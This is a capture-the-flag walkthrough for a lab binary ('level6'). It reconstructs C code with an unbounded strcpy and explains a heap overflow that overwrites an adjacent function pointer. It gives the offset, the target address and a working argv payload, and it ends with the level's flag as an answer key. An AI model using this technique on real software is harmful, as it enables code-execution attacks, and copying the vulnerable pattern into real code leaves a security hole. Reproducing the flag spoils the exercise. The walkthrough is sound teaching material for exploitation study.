# level6 — heap overflow: overwrite a function pointer

**Teaches:** heap layout and overwriting a pointer stored next to your buffer.
Re-read primer §5.

## 1. What the binary does
```
./level6        # segfault (no argv[1])
./level6 a      # Nope
```

## 2. Reconstructed C
```c
void n(void) { system("/bin/cat /home/user/level7/.pass"); }  // NEVER called
void m(void) { puts("Nope"); }

int main(int ac, char **av) {
    char *arg      = malloc(64);      // heap chunk A
    void (**func)() = malloc(4);      // heap chunk B, right after A
    *func = m;                        // B holds a pointer to m()
    strcpy(arg, av[1]);               // <-- overflow A into B
    (**func)();                       // calls whatever B points to
    return 0;
}
```

## 3. The vulnerability
`strcpy(arg, av[1])` has no bound. `arg` (64 bytes) and `func` (the function
pointer) are consecutive heap chunks. Overflowing `arg` overwrites the pointer
in `func`; when `main` does `(**func)()`, it calls **your** address. Point it at
`n()`.

## 4. Memory map
```
HEAP:  0x0804a008: [ arg: 64 bytes ][ header ] 0x0804a050: [ func: pointer -> m ]
       |<---------------- overflow 72 bytes ----------------->|  then write n()
```

## 5. Step by step
1. `disassemble main` → two `malloc`, `strcpy`, then `call eax` (the call
   through `func`). `disassemble n` → `system` → `n` is at `0x08048454`.
2. Offset from start of `arg` to the pointer = **72** (pattern crash on the
   `call eax`, or reason it from the chunk sizes).

## 6. Exploit
```
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```
Note: the payload goes in **argv[1]**, not stdin (the program segfaults without
an argument). With `tools/payload.py`: offset `72`, address `0x08048454`, then
use the argv run line.

**Why it works:** 72 bytes fill `arg` and its chunk header; the next 4 bytes
overwrite `func`'s pointer with `n`'s address, so `(**func)()` calls `n()`.

Flag → `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
